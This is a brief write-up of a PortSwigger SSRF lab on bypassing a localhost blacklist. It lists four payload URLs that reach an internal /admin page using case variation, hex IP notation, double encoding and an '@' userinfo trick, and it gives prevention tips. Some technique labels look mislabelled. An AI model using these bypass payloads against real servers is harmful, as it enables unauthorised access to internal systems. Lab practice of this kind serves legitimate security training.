# SSRF - Blacklist Bypass

## Lab Link
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-bypass

## Vulnerability Type
Server-Side Request Forgery (SSRF)

## Difficulty
Medium

## Theory
Applications implementing SSRF filters often use blacklists. These can be bypassed:
- Encoding tricks (double URL encoding)
- Alternative IP formats (octal, hex)
- DNS rebinding
- Protocol confusion (http → https)
- Case variation

## Exploitation

**Blocked URL:**
```
https://localhost/admin
```

**Bypass techniques:**
```
1. Case variation: https://LoCaLhOsT/admin
2. Hex encoding: https://0x7f.0x0.0x0.0x1/admin
3. URL encoding: https://127.0.0.1%252F../admin
4. Double dot: https://127.0.0.1:8080@localhost/admin
```

## Prevention
- Use whitelist instead of blacklist
- Validate URLs with dedicated library
- Disable dangerous protocols
- Use DNS rebinding protection

---

**Difficulty**: Medium
**Time**: 15-20 minutes
